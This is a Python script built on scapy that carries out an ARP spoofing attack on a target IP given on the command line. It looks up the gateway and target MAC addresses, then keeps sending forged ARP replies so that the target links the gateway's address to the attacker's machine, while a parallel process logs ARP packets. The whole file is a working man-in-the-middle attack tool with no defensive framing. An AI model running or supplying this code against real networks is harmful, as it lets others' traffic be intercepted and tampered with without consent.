from scapy.all import ARP, Ether, srp, sniff, send
from multiprocessing import Process
import time
import get_network
import logging
import argparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
parser = argparse.ArgumentParser(description="ARP Spoofing Script")
parser.add_argument("target_ip", help="Target IP address to spoof")
args = parser.parse_args()

"""""""""""""""""""""""""""
INITIALIZE NETWORK VARIABLES
"""""""""""""""""""""""""""
def get_mac_by_ip(ip: str):
    arp_request = ARP(pdst=ip)
    ether_request = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether_request / arp_request
    ans, _ = srp(packet, timeout=2, verbose=False)
    mac = None
    for _, received in ans:
        mac = str(received.hwsrc)
    if not mac:
        raise Exception(f'Could not get {ip} MAC')
    return str(mac)

CURRENT_NETWORK = get_network.get_network_values()
if not CURRENT_NETWORK:
    raise Exception('Could not get current network')

GATEWAY_IP = CURRENT_NETWORK['gateway']
LOCAL_IP = CURRENT_NETWORK['ip']
LOCAL_MAC = CURRENT_NETWORK['mac']
GATEWAY_MAC = get_mac_by_ip(GATEWAY_IP)
TARGET_IP = args.target_ip
TARGET_MAC = get_mac_by_ip(TARGET_IP)

"""""""""""""""""""""""""""
ARP SNIFFER FUNCTION
"""""""""""""""""""""""""""
def monitor_arp(pkt):
    if pkt.haslayer(ARP):
        src_ip = pkt.psrc
        dst_ip = pkt.pdst
        src_mac = pkt.hwsrc
        dst_mac = pkt.hwdst
        arp_op = "request" if int(pkt.op) == 1 else "reply"

        if src_ip in [LOCAL_IP, TARGET_IP] or dst_ip in [LOCAL_IP, TARGET_IP]:
            print(f"[*] ARP Packet: {arp_op} - Source: {src_ip} ({src_mac}) -> Destination: {dst_ip} ({dst_mac})")

def sniff_arp():
    print("[*] Starting ARP Sniffer...")
    sniff(prn=monitor_arp, filter="arp", store=0)

"""""""""""""""""""""""""""
ARP SPOOF FUNCTION
"""""""""""""""""""""""""""
def unsolicited_arp_reply(target_ip, alleged_ip, target_mac):
    while True:
        arp_response = ARP(op=2, pdst=target_ip, psrc=alleged_ip, hwdst=target_mac, hwsrc=LOCAL_MAC)
        send(arp_response, verbose=False)
        print(f"[*] Sent ARP reply: {target_ip} now sees {alleged_ip} as {LOCAL_MAC}.")
        time.sleep(5)  # Sleep to avoid flooding the network too aggressively

def start_arp_spoof():
    print("[*] Starting ARP spoofing attack...")
    unsolicited_arp_reply(TARGET_IP, GATEWAY_IP, TARGET_MAC)

if __name__ == "__main__":
    sniff_process = Process(target=sniff_arp)
    spoof_process = Process(target=start_arp_spoof)

    sniff_process.start()
    spoof_process.start()

    sniff_process.join()
    spoof_process.join()
